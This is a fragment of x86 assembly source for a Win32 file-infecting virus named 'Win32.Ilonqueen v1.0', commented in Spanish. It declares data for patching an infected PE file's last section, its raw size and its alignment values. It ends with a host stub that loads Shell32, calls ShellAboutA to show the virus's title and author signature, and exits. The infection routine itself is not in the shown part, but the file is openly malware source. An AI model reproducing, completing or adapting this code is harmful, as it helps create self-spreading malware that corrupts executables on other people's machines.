    ; Información referente al propio virus para usar en las funciones
    longVirus               equ         finvir - start
    longVirusHost           dd          0

    ; Datos relativos al archivo infectado, los cuales modificaremos
    UltimaSeccPE            dd          0
    SizeOfRDAnt             dd          0                   ; SizeOfRawData antes del cambio
    SizeOfRDNuevo           dd          0                   ; SizeOfRawData después del cambio
    hostPE                  dd          0
    AlineamArchivo          dd          0
    AlineamSeccion          dd          0

    ; Información para el final del malware
    pathToModule            db          260     DUP     (0)

ojete_2:
    sub ebp,offset delta
    jmp liliflor

    titulo          db      'System Info#+ [Win32.Ilonqueen v1.0]',0
    sign            db      '(C)  2018 Mister F9',0

    interes         db      'No Game No Life',0

    stShellAbout    db      'ShellAboutA',0
    stShell32       db      'Shell32',0

Host:
    
    ; Mostramos una messagebox
    push offset stShell32
    call [ebp + ddLoadLibrary]
    push offset stShellAbout
    push eax
    call [ebp + ddGetProcAddress]

    push 0
    lea ebx, [ebp + sign]
    push ebx
    lea ebx,[ebp + titulo]
    push ebx
    push 0
    call eax

    push 0
    call [ebp + ddExitProcess]


finvir:
end start